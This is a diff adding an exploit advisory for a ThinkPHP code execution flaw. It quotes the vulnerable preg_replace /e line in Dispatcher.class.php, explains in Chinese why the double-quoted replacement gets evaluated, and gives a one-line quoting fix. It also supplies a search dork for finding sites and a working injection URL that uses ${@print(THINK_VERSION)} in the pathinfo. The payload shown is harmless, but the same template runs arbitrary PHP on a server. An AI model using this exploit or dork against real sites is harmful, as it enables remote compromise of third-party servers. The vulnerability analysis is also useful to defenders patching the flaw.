@@ -1,0 +1,37 @@
+
+########################################################
+#
+# Exploit Title : ThinkPHP code execution vulnerability
+#
+# Author        : GaRY
+#
+# Home          : http://www.80sec.com
+#
+# Software Link : http://thinkphp.cn
+#
+# Security Risk : High
+#
+# Version       : All Version
+#
+# Tested on     : GNU/Linux Ubuntu – Windows Server – win7
+#
+# Dork          : “Powered by thinkphp”
+#
+########################################################
+#
+setp1.
+Analyze Code:
+/trunk/ThinkPHP/Lib/Core/Dispatcher.class.php
+125  -   $res = preg_replace(‘@(w+)’.$depr.’([^'.$depr.'\/]+)@e’, ‘$var[\'\\1\']=”\\2″;’, implode($depr,$paths));
+125  +   $res = preg_replace(‘@(w+)’.$depr.’([^'.$depr.'\/]+)@e’, ‘$var[\'\\1\']=\’\\2\’;', implode($depr,$paths));
+这个代码是把pathinfo当作restful类型url进行解析的，主要作用是把pathinfo中的数据解析并合并到$_GET数组中。
+然而在用正则解析pathinfo的时候，主要是这一句：
+$res = preg_replace(‘@(w+)’.$depr.’([^'.$depr.'\/]+)@e’, ‘$var[\'\\1\']=”\\2″;’, implode($depr,$paths));
+这里明显使用了preg_replace的/e参数，这是个非常危险的参数，如果用了这个参数，preg_replace第二个参数就会被当做php代码执行，作者用这种方式在第二个参数中，利用PHP代码给数组动态赋值。
+‘$var[\'\\1\']=”\\2″;’
+而这里又是双引号，而双引号中的php变量语法又是能够被解析执行的。
+step2.
+Expl0iTs :
+#
+[TarGeT]/index.php/module/action/param1/${@print(THINK_VERSION)}
+
